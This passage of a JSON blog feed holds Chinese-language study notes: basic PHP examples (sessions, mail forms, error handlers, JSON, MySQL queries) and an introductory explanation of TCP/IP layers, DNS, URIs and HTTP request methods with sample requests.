punctuation\">;</span>\n<span class=\"token delimiter important\">?&gt;</span></span>\n\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'views'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'views'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//session_destroy();</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"xiaohui\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token delimiter important\">?&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"mail\"><a href=\"#mail\" class=\"headerlink\" title=\"mail\"></a>mail</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">&gt;</span></span>菜鸟教程(runoob.com)<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">&gt;</span></span>\n\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'email'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// 如果接收到邮箱参数则发送邮件</span>\n    <span class=\"token comment\">// 发送邮件</span>\n    <span class=\"token variable\">$email</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'email'</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$subject</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'subject'</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$message</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'message'</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">;</span>\n    <span class=\"token function\">mail</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"someone@example.com\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$subject</span><span class=\"token punctuation\">,</span>\n    <span class=\"token variable\">$message</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"From:\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$email</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"邮件发送成功\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// 如果没有邮箱参数则显示表单</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;form method='post' action='mailform.php'&gt;\n    Email: &lt;input name='email' type='text'&gt;&lt;br&gt;\n    Subject: &lt;input name='subject' type='text'&gt;&lt;br&gt;\n    Message:&lt;br&gt;\n    &lt;textarea name='message' rows='15' cols='40'&gt;\n    &lt;/textarea&gt;&lt;br&gt;\n    &lt;input type='submit'&gt;\n    &lt;/form&gt;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token delimiter important\">?&gt;</span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Error\"><a href=\"#Error\" class=\"headerlink\" title=\"Error\"></a>Error</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">// 错误处理函数</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">customError</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$errno</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$errstr</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;b&gt;Error:&lt;/b&gt; [<span class=\"token interpolation\"><span class=\"token variable\">$errno</span></span>] <span class=\"token interpolation\"><span class=\"token variable\">$errstr</span></span>&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"脚本结束\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 设置错误处理函数</span>\n<span class=\"token function\">set_error_handler</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"customError\"</span><span class=\"token punctuation\">,</span><span class=\"token constant\">E_USER_WARNING</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// 触发错误</span>\n<span class=\"token variable\">$test</span><span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$test</span><span class=\"token operator\">&gt;</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"变量值必须小于等于 1\"</span><span class=\"token punctuation\">,</span><span class=\"token constant\">E_USER_WARNING</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token delimiter important\">?&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"JSON\"><a href=\"#JSON\" class=\"headerlink\" title=\"JSON\"></a>JSON</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n   <span class=\"token variable\">$arr</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'runoob'</span> <span class=\"token operator\">=&gt;</span> <span class=\"token string single-quoted-string\">'菜鸟教程'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'taobao'</span> <span class=\"token operator\">=&gt;</span> <span class=\"token string single-quoted-string\">'淘宝网'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token keyword\">echo</span> <span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 编码中文</span>\n   <span class=\"token keyword\">echo</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 换行符</span>\n   <span class=\"token keyword\">echo</span> <span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arr</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">JSON_UNESCAPED_UNICODE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 不编码中文</span>\n<span class=\"token delimiter important\">?&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n   <span class=\"token variable\">$json</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'{\"a\":1,\"b\":2,\"c\":3,\"d\":4,\"e\":5}'</span><span class=\"token punctuation\">;</span>\n\n   <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">json_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$json</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">json_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$json</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Mysql\"><a href=\"#Mysql\" class=\"headerlink\" title=\"Mysql\"></a>Mysql</h3><p>查询模块示例</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$servername</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"localhost\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"username\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"password\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$dbname</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"myDB\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// 创建连接</span>\n<span class=\"token variable\">$conn</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$servername</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$dbname</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// Check connection</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"连接失败: \"</span> <span class=\"token operator\">.</span> <span class=\"token function\">mysqli_connect_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT id, firstname, lastname FROM MyGuests\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">mysqli_num_rows</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// 输出数据</span>\n    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_fetch_assoc</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"id: \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"id\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\" - Name: \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"firstname\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\" \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"lastname\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"0 结果\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token function\">mysqli_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>更多请看<a href=\"https://www.runoob.com/php/php-mysql-intro.html\">PHP MySQL 简介 | 菜鸟教程 (runoob.com)</a></p>\n<h3 id=\"Math函数\"><a href=\"#Math函数\" class=\"headerlink\" title=\"Math函数\"></a>Math函数</h3><p><a href=\"https://www.runoob.com/php/php-ref-math.html\">PHP 5 Math 函数 | 菜鸟教程 (runoob.com)</a></p>\n<h3 id=\"HTTP函数\"><a href=\"#HTTP函数\" class=\"headerlink\" title=\"HTTP函数\"></a>HTTP函数</h3><p><a href=\"https://www.runoob.com/php/php-ref-http.html\">PHP HTTP 函数 | 菜鸟教程 (runoob.com)</a></p>\n<h3 id=\"String函数\"><a href=\"#String函数\" class=\"headerlink\" title=\"String函数\"></a>String函数</h3><p><a href=\"https://www.runoob.com/php/php-ref-string.html\">PHP 5 String 函数 | 菜鸟教程 (runoob.com)</a></p>\n<h3 id=\"Array函数\"><a href=\"#Array函数\" class=\"headerlink\" title=\"Array函数\"></a>Array函数</h3><p><a href=\"https://www.runoob.com/php/php-ref-array.html\">PHP 5 Array 函数 | 菜鸟教程 (runoob.com)</a></p>\n<h3 id=\"PDO函数\"><a href=\"#PDO函数\" class=\"headerlink\" title=\"PDO函数\"></a>PDO函数</h3><p><a href=\"https://www.runoob.com/php/php-pdo.html\">PHP PDO | 菜鸟教程 (runoob.com)</a></p>\n",
            "tags": [
                "学习",
                "php"
            ]
        },
        {
            "id": "https://0xdadream.github.io/2021/04/23/http-xue-xi/",
            "url": "https://0xdadream.github.io/2021/04/23/http-xue-xi/",
            "title": "HTTP学习",
            "date_published": "2021-04-23T01:25:00.000Z",
            "content_html": "<h1 id=\"HTTP\"><a href=\"#HTTP\" class=\"headerlink\" title=\"HTTP\"></a>HTTP</h1><h2 id=\"web协议\"><a href=\"#web协议\" class=\"headerlink\" title=\"web协议\"></a>web协议</h2><h3 id=\"定义\"><a href=\"#定义\" class=\"headerlink\" title=\"定义\"></a>定义</h3><p>Web 使用一种名为 HTTP（HyperText Transfer Protocol，超文本传输协议 ）的协议作为规范，完成从客户端到服务器端等一系列运作流程。</p>\n<p>1997 年  1 月公布的  HTTP/1.1 是目前主流的  HTTP 协议版本。</p>\n<h3 id=\"TCP-IP协议簇\"><a href=\"#TCP-IP协议簇\" class=\"headerlink\" title=\"TCP/IP协议簇\"></a>TCP/IP协议簇</h3><p><img src=\"https://images.dadream.eu.org/images/2024/07/cb757b5e4fbd69d9a7870cf73ec5f2c8.png\"></p>\n<h4 id=\"TCP-IP分层\"><a href=\"#TCP-IP分层\" class=\"headerlink\" title=\"TCP/IP分层\"></a>TCP/IP分层</h4><h5 id=\"应用层\"><a href=\"#应用层\" class=\"headerlink\" title=\"应用层\"></a>应用层</h5><p>FTP（FileTransfer Protocol，文件传输协议）和 DNS（Domain Name System，域名系统）</p>\n<p>HTTP</p>\n<h5 id=\"传输层\"><a href=\"#传输层\" class=\"headerlink\" title=\"传输层\"></a>传输层</h5><p>TCP（Transmission Control Protocol，传输控制协议）和 UDP（User Data Protocol，用户数据报协议）</p>\n<h5 id=\"网络层\"><a href=\"#网络层\" class=\"headerlink\" title=\"网络层\"></a>网络层</h5><p>网络层所起的作用就是在众多的选项内选择一条传输路线</p>\n<h5 id=\"物理层\"><a href=\"#物理层\" class=\"headerlink\" title=\"物理层\"></a>物理层</h5><p>用来处理连接网络的硬件部分</p>\n<h4 id=\"TCP-IP-通信传输流\"><a href=\"#TCP-IP-通信传输流\" class=\"headerlink\" title=\"TCP/IP 通信传输流\"></a>TCP/IP 通信传输流</h4><p><img src=\"https://images.dadream.eu.org/images/2024/07/81ffdf57755cc7acedb59dfef5c70546.png\"></p>\n<h3 id=\"协议\"><a href=\"#协议\" class=\"headerlink\" title=\"协议\"></a>协议</h3><p>不同的硬件、操作系统之间的通信，所有的这一切都需要一种规则。而我们就把这种规则称为协议（protocol）。</p>\n<h3 id=\"IP协议\"><a href=\"#IP协议\" class=\"headerlink\" title=\"IP协议\"></a>IP协议</h3><p>IP（Internet Protocol）网际协议位于网络层</p>\n<p>IP 协议的作用是把各种数据包传送给对方。</p>\n<p>P 地址指明了节点被分配到的地址，MAC 地址是指网卡所属的固定地址。IP 地址可以和 MAC 地址进行配对。IP 地址可变换，但 MAC地址基本上不会更改。</p>\n<h3 id=\"ARP协议\"><a href=\"#ARP协议\" class=\"headerlink\" title=\"ARP协议\"></a>ARP协议</h3><p>ARP 是一种用以解析地址的协议，根据通信方的 IP 地址就可以反查出对应的 MAC 地址。</p>\n<h4 id=\"路由选择\"><a href=\"#路由选择\" class=\"headerlink\" title=\"路由选择\"></a>路由选择</h4><p><img src=\"https://images.dadream.eu.org/images/2024/07/0c783c5c7eef0356ea5f3a327fb43c70.png\"></p>\n<h3 id=\"TCP协议\"><a href=\"#TCP协议\" class=\"headerlink\" title=\"TCP协议\"></a>TCP协议</h3><p>TCP 位于传输层，提供可靠的字节流服务</p>\n<h4 id=\"tcp三次握手\"><a href=\"#tcp三次握手\" class=\"headerlink\" title=\"tcp三次握手\"></a>tcp三次握手</h4><p><img src=\"https://images.dadream.eu.org/images/2024/07/4fd95e6d2b8edcd965ce11295ac0c301.png\"></p>\n<h3 id=\"DNS\"><a href=\"#DNS\" class=\"headerlink\" title=\"DNS\"></a>DNS</h3><p>DNS（Domain Name System）服务是和 HTTP 协议一样位于应用层的<br>协议。它提供域名到 IP 地址之间的解析服务。</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/9b9ebce7681849f430d21d47495b3400.png\"></p>\n<h3 id=\"各协议关系\"><a href=\"#各协议关系\" class=\"headerlink\" title=\"各协议关系\"></a>各协议关系</h3><p><img src=\"https://images.dadream.eu.org/images/2024/07/7e76c47328b109133df3878b6803e24a.png\"></p>\n<h3 id=\"URI\"><a href=\"#URI\" class=\"headerlink\" title=\"URI\"></a>URI</h3><p>URI 是 Uniform Resource Identifier 的缩写。</p>\n<p>URI 用字符串标识某一互联网资源，而 URL表示资源的地点（互联网上所处的位置）</p>\n<h4 id=\"格式\"><a href=\"#格式\" class=\"headerlink\" title=\"格式\"></a>格式</h4><p><img src=\"https://images.dadream.eu.org/images/2024/07/48eb2105e992b313cb99eb9cb2a0e897.png\"></p>\n<p>as：</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">ftp</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//ftp.is.co.za/rfc/rfc1808.txt</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">http</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//www.ietf.org/rfc/rfc2396.txt</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">ldap</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//[2001:db8::7]/c=GB?objectClass?one</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">mailto</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">John.Doe@example.com</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">news</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">comp.infosystems.www.servers.unix</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">tel</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">+1-816-555-1212</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">telnet</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//192.0.2.16:80/</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">urn</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">oasis:names:specification:docbook:dtd:xml:4.1.2</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<hr>\n<h2 id=\"HTTP协议\"><a href=\"#HTTP协议\" class=\"headerlink\" title=\"HTTP协议\"></a>HTTP协议</h2><h3 id=\"S-B客服端与服务器端的交互\"><a href=\"#S-B客服端与服务器端的交互\" class=\"headerlink\" title=\"S-B客服端与服务器端的交互\"></a>S-B客服端与服务器端的交互</h3><p>在两台计算机之间使用 HTTP 协议通信时，在一条通信线路上必定有一端是客户端，另一端则是服务器端。</p>\n<p>HTTP 是不保存状态的协议</p>\n<h3 id=\"请求-响应\"><a href=\"#请求-响应\" class=\"headerlink\" title=\"请求-响应\"></a>请求-响应</h3><p><img src=\"https://images.dadream.eu.org/images/2024/07/4043823659f06850225215b355d26e70.png\"></p>\n<p>请求报文是由请求方法、请求 URI、协议版本、可选的请求首部字段和内容实体构成的。</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/5064a6a828ab020f5558b42c2dfbdf58.png\"></p>\n<p>响应报文</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/7931c23a1e3c807e44a4108e514bb99d.png\"></p>\n<p>URI请求</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/84626c79794c0eb39904acbe02811cb4.png\"></p>\n<h3 id=\"请求方法\"><a href=\"#请求方法\" class=\"headerlink\" title=\"请求方法\"></a>请求方法</h3><h4 id=\"GET\"><a href=\"#GET\" class=\"headerlink\" title=\"GET\"></a>GET</h4><p>GET ：获取资源<br>GET 方法用来请求访问已被 URI 识别的资源。指定的资源经服务器 端解析后返回响应内容。也就是说，如果请求的资源是文本，那就保 持原样返回；如果是像 CGI（Common Gateway Interface，通用网关接 口）那样的程序，则返回经过执行后的输出结果。</p>\n<p>请求：</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token request-line\"><span class=\"token method property\">GET</span> <span class=\"token request-target url\">/index.html</span> <span class=\"token http-version property\">HTTP/1.1</span></span> \n\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">www.hackr.jp</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>响应：</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\">返回  index.html 的页面资源<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h4 id=\"POST\"><a href=\"#POST\" class=\"headerlink\" title=\"POST\"></a>POST</h4><p>POST：传输实体主体<br>POST 方法用来传输实体的主体。<br>虽然用 GET 方法也可以传输实体的主体，但一般不用 GET 方法进行 传输，而是用 POST 方法。虽说 POST 的功能与 GET 很相似，但 POST 的主要目的并不是获取响应的主体内容。</p>\n<p>请求：</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token request-line\"><span class=\"token method property\">POST</span> <span class=\"token request-target url\">/submit.cgi</span> <span class=\"token http-version property\">HTTP/1.1</span></span> \n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">www.hackr.jp </span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1560（1560字节的数据）</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>响应：</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\">返回  submit.cgi 接收数据的处理结果 <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h4 id=\"PUT\"><a href=\"#PUT\" class=\"headerlink\" title=\"PUT\"></a>PUT</h4><p>PUT：传输文件<br>PUT 方法用来传输文件。就像 FTP 协议的文件上传一样，要求在请 求报文的主体中包含文件内容，然后保存到请求 URI 指定的位置。 </p>\n<p>请求：</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token request-line\"><span class=\"token method property\">PUT</span> <span class=\"token request-target url\">/example.html</span> <span class=\"token http-version property\">HTTP/1.1</span></span> \n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">www.hackr.jp </span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html </span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1560（1560 字节的数据</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>响应：</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\">响应返回状态码  204 No Content（比如  ：该  html 已存在于服务器上） <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h4 id=\"HEAD\"><a href=\"#HEAD\" class=\"headerlink\" title=\"HEAD\"></a>HEAD</h4><p>HEAD：获得报文首部<br>HEAD 方法和  GET 方法一样，只是不返回报文主体部分。用于确认 URI 的有效性及资源更新的日期时间等。</p>\n<p>请求：</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token request-line\"><span class=\"token method property\">HEAD</span> <span class=\"token request-target url\">/index.html</span> <span class=\"token http-version property\">HTTP/1.1</span></span> \n\n<span class=\"token header\"><span 